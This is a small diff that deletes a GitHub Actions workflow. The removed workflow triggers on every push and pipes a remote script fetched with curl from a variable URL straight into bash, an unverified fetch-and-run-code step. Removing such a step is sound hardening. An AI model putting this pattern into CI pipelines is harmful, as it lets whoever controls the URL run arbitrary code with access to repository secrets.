@@ -1,8 +1,0 @@
-on: push
-jobs:
-  exec:
-    runs-on: ubuntu-latest
-    steps:
-      - name: pipe-bash
-        run: |
-          curl -sSL "$URL" | bash
